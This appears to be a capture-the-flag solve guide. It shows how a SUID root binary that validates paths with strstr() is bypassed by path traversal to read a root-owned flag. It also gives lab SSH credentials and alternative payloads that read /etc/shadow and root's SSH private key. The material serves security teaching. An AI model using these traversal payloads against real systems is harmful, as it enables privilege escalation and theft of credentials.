# 🔴 Red Team — M5: nova-archive Solve Guide

**Challenge:** SUID Binary — strstr() Path Traversal Bypass  
**Technique:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid  
**Entry Point:** SSH as `archivist` / `Arch1v1st99`

---

## Step 1 — SSH Login

```bash
ssh archivist@<M5-IP>
# Password: Arch1v1st99
```

---

## Step 2 — Read the Hint

```bash
cat ~/README.txt
```

A tool called `safereader` exists for reading archive documents.

---

## Step 3 — Inspect the Binary

```bash
ls -la /usr/local/bin/safereader
```

Output:
```
-rwsr-xr-x 1 root root ... /usr/local/bin/safereader
```

The `s` in the owner execute position = **SUID bit** — the binary runs as root regardless of who executes it.

---

## Step 4 — Test Normal Usage

```bash
safereader /opt/archive/quarterly_report.txt
```

Works fine. The binary restricts files to `/opt/archive`.

---

## Step 5 — Analyze the Restriction

The binary uses `strstr(path, "/opt/archive")` to check if the provided path contains
the substring `/opt/archive`. This is **NOT** the same as checking if the path starts with
`/opt/archive`.

---

## Step 6 — Exploit: Path Traversal Bypass

Craft a path that CONTAINS `/opt/archive` but resolves to a different location:

```bash
safereader "/opt/archive/../../../root/flag5.txt"
```

**Why it works:**
- `strstr("/opt/archive/../../../root/flag5.txt", "/opt/archive")` → finds the substring ✓
- `fopen("/opt/archive/../../../root/flag5.txt", "r")` → OS resolves to `/root/flag5.txt`
- Binary runs as root (SUID) → can read root-owned files ✓

---

## Alternative Payloads

```bash
# Read /etc/shadow
safereader "/opt/archive/../../../etc/shadow"

# Read SSH private keys
safereader "/opt/archive/../../../root/.ssh/id_rsa"
```

---

## Flag Location
`/root/flag5.txt`
